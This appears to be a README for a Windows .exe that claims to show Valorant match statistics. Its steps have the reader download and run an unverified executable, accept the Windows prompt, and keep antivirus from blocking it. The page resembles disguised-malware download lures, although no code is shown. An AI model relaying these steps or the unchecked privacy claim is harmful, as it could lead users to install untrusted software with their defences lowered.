📊 vlravg-match-stats - See your Valorant match history stats

Download Software

This tool helps Valorant players understand their performance. It connects to game data to show your lobby ranks, your kill-death ratios, and who you play with most often. It provides a clear view of your progression through the game.

🚀 Getting Started

You can run this application on most Windows computers. Ensure you have an active internet connection to retrieve your match data from the official servers.

System Requirements

  • Windows 10 or 11
  • Active Valorant account
  • Standard internet connection

📥 Installation

Follow these steps to set up the tracker on your machine:

  1. Visit the download page here.
  2. Look for the latest release version on the page.
  3. Click the file ending in .exe to start the download.
  4. Open your Downloads folder once the file finishes.
  5. Double-click the file to start the application.
  6. Windows might ask for permission to run the tool; click Yes or Run.

📈 Features

  • Lobby Rank Tracking: See the skill level of every person in your matches.
  • K/D Ratios: View your combat performance for every single game you play.
  • Frequent Duos: Identify the friends you play with most often.
  • Time Tracking: Monitor your total hours spent in matches.

🛠 Troubleshooting

If the program does not open, ensure your antivirus software is not blocking the connection. This tool relies on the HenrikDev API to fetch data. If the server experiences high traffic, the stats might take a few extra seconds to load. Always keep your application updated to ensure you see the latest match data.

🔒 Privacy

This tool reads match results. It does not store your login credentials or personal account passwords. Your data stays private during the process.
